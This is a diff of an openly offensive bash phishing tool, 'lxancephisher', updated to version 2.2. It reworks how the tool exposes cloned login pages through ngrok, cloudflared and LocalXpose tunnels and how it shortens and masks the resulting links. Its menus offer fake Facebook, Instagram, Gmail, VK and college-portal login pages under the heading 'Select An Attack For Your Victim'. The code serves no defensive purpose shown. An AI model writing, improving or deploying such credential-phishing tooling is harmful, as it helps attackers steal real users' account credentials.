@@ -2,7 +2,7 @@
 
 ##   lxancephisher 	: 	Automated Phishing Tool
 ##   Author 		: 	Prince Katiyar
-##   Version 		: 	2.1
+##   Version 		: 	2.2
 ##   Github 		: 	https://github.com/LxaNce-Hacker/lxancephisher
 
 
@@ -79,7 +79,7 @@
 ##      Copyright (C) 2022 LXANCE-HACKER (https://github.com/LxaNce-Hacker)
 ##
 
-__version__="2.1"
+__version__="2.2"
 
 ## DEFAULT HOST & PORT 
 HOST='127.0.0.1'
@@ -142,10 +142,11 @@ reset_color() {
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php ngrok cloudflared loclx"
-	for process in ${check_PID}; do
-		if [[ $(pidof ${process}) ]]; then # Check for Process
-			killall ${process} > /dev/null 2>&1 # Kill the Process
+	check_PID=("php" "ngrok" "cloudflared" "loclx" "ssh")
+	for process in "${check_PID[@]}"; do
+		if pidof "${process}" > /dev/null 2>&1; then # Check for Process
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Killing process : ${ORANGE}$process${WHITE}"
+			killall "${process}" > /dev/null 2>&1
 		fi
 	done
 }
@@ -185,16 +186,28 @@ check_update(){
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
-	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+	if [ $? -ne 0 ]; then
+		echo -e "${RED}Offline${WHITE}\n"
+		read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want To Continue Without Internet ${GREEN}[${CYAN}Y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+		if [[ ${P_ANS} =~ ^([yY])$ ]]; then
+			echo -e "\n"
+		else
+			echo -ne "\n\n${RED}[${WHITE}👋${RED}]${BLUE} Bye !!! ${WHITE}\n"
+			exit 1
+		fi
+	else
+		echo -e "${GREEN}Online${WHITE}"
+		check_update
+	fi
 }
 
 ## Banner
 banner() {
 	cat <<- EOF
 		${BLUE}
-		${MAGENTA}▒█░░░ ▀▄▒▄▀ ░█▀▀█ ▒█▄░▒█ ▒█▀▀█ ▒█▀▀▀ 　 ▒█▀▀█ ▒█░▒█ ▀█▀ ▒█▀▀▀█ ▒█░▒█ ▒█▀▀▀ ▒█▀▀█
-		${MAGENTA}▒█░░░ ░▒█░░ ▒█▄▄█ ▒█▒█▒█ ▒█░░░ ▒█▀▀▀ 　 ▒█▄▄█ ▒█▀▀█ ▒█░ ░▀▀▀▄▄ ▒█▀▀█ ▒█▀▀▀ ▒█▄▄▀
-		${MAGENTA}▒█▄▄█ ▄▀▒▀▄ ▒█░▒█ ▒█░░▀█ ▒█▄▄█ ▒█▄▄▄ 　 ▒█░░░ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█░▒█
+		${MAGENTA}░█░░░█░█░█▀█░█▀█░█▀▀░█▀▀░░░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
+		${MAGENTA}░█░░░▄▀▄░█▀█░█░█░█░░░█▀▀░░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
+		${MAGENTA}░▀▀▀░▀░▀░▀░▀░▀░▀░▀▀▀░▀▀▀░░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
 		${RED}          Version : ${__version__}
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by LxaNce-Hacker (Prince Katiyar)${WHITE}
@@ -205,10 +218,10 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${RED}▒█░░░ ▀▄▒▄▀ ░█▀▀█ ▒█▄░▒█ ▒█▀▀█ ▒█▀▀▀ 　 ▒█▀▀█ ▒█░▒█ ▀█▀ ▒█▀▀▀█ ▒█░▒█ ▒█▀▀▀ ▒█▀▀█
-		${RED}▒█░░░ ░▒█░░ ▒█▄▄█ ▒█▒█▒█ ▒█░░░ ▒█▀▀▀ 　 ▒█▄▄█ ▒█▀▀█ ▒█░ ░▀▀▀▄▄ ▒█▀▀█ ▒█▀▀▀ ▒█▄▄▀
-		${RED}▒█▄▄█ ▄▀▒▀▄ ▒█░▒█ ▒█░░▀█ ▒█▄▄█ ▒█▄▄▄ 　 ▒█░░░ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█░▒█
-		${WHITE}        Version : ${__version__}
+		${RED}░█░░░█░█░█▀█░█▀█░█▀▀░█▀▀░░░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
+		${RED}░█░░░▄▀▄░█▀█░█░█░█░░░█▀▀░░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
+		${RED}░▀▀▀░▀░▀░▀░▀░▀░▀░▀▀▀░▀▀▀░░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
+		${MAGENTA}        Version : ${__version__}
 		
 	EOF
 }
@@ -226,6 +239,11 @@ dependencies() {
 		if [[ ! $(command -v tput) ]]; then
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
 			pkg install ncurses-utils -y
+		fi
+
+		if [[ ! $(command -v cloudflared) ]]; then
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}cloudflared${CYAN}"${WHITE}
+			pkg install cloudflared -y
 		fi
 	fi
 
@@ -384,7 +402,7 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}Y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
 		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
@@ -455,7 +473,7 @@ start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}Y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
@@ -473,14 +491,19 @@ start_ngrok() {
 
 
 ## Start Cloudflared
-start_cloudflared() { 
+start_cloudflared() {
 	rm .cld.log > /dev/null 2>&1 &
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
-	if [[ `command -v termux-chroot` ]]; then
+	# Check if Cloudflared is installed
+	if command -v cloudflared > /dev/null 2>&1; then
+		# If installed, use the system Cloudflared
+		echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Cloudflared package detected. Using system Cloudflared..."
+		sleep 2 && cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	elif [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	else
 		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
@@ -546,7 +569,7 @@ start_loclx() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}Y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
@@ -607,7 +630,7 @@ tunnel_menu() {
 ## Custom Mask URL
 custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}Y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
@@ -656,18 +679,22 @@ custom_url() {
 	url=${1#http*//}
 	sleep 2
 	lxance="https://lxance.site/u/?url="
-	cleanuri="https://cleanuri.com/api/v1/shorten"
 	isgd="https://www.is.gd/create.php?format=simple&url="
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
 	if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|serveo.net|loclx.io) ]]; then
-		echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} URL matches allowed domains..."
+		echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} URL Matches Allowed Domains..."
 		if [[ $(site_stat $lxance) == 2* ]]; then
             shorten $lxance "$url"
-		elif [[ $(curl -i -s -X POST -d "url=https://example.com" https://cleanuri.com/api/v1/shorten | grep -i 'HTTP/' | awk '{print $2}') == 2* ]]; then
-			Cleanuri $cleanuri "https://$url"
+            if [[ $(site_stat $isgd) == 2* ]]; then
+				shorteny $isgd "$processed_url"
+			elif [[ $(site_stat $shortcode) == 2* ]]; then
+				shorten $shortcode "$processed_url"
+			else
+				shorten $tinyurl "$url"
+			fi
 		elif [[ $(site_stat $isgd) == 2* ]]; then
 			shorteny $isgd "$url"
 		elif [[ $(site_stat $shortcode) == 2* ]]; then
@@ -681,25 +708,37 @@ custom_url() {
 		processed_url="https://$processed_url"
 	else
 		# echo "[!] No url provided / Regex Not Matched"
-		url="Unable to generate links. Try after turning on hotspot"
+		url="Unable to generate links"
 		processed_url="Unable to Short URL"
+		note="URL generation failed! Possible reasons:
+	1. The current port might be busy or blocked.
+	2. Ensure that your internet connection is active.
+	3. If you're using a hotspot, ensure it's turned on.
+	4. The tunneling service might not be functioning properly. Try restarting the tool or using a different tunneling option.
+
+Suggested Solution: Try using a different port or restart your network."
+
 	fi
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
 	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+
+	if [[ $url == *"Unable to generate links"* ]]; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${YELLOW} $note"
+	fi
 }
 
 ##PSIT
 site_psit() {
 	cat <<-EOF
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 		${RED}[${WHITE}01${RED}]${ORANGE} Psit Normal Portal
 		${RED}[${WHITE}02${RED}]${ORANGE} Psitche Normal Portal
 		${RED}[${WHITE}03${RED}]${ORANGE} Increase Presenty
 		${RED}[${WHITE}04${RED}]${ORANGE} Search About Students
 		${RED}[${WHITE}05${RED}]${ORANGE} Advanced Page
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 	EOF
 	
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -735,12 +774,12 @@ site_psit() {
 ## Facebook
 site_facebook() {
 	cat <<- EOF
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -771,12 +810,12 @@ site_facebook() {
 ## Instagram
 site_instagram() {
 	cat <<- EOF
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -807,11 +846,11 @@ site_instagram() {
 ## Gmail/Google
 site_gmail() {
 	cat <<- EOF
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -838,10 +877,10 @@ site_gmail() {
 ## Vk
 site_vk() {
 	cat <<- EOF
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -866,7 +905,7 @@ main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
@@ -881,7 +920,7 @@ main_menu() {
 		${RED}[${WHITE}34${RED}]${ORANGE} ApnaPSIT      ${RED}[${WHITE}35${RED}]${ORANGE} Discord      ${RED}[${WHITE}36${RED}]${ORANGE} GoogleCloud
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
-		${GREEN}**********************************************************************************************************************
+		${GREEN}
 
 	EOF
 	
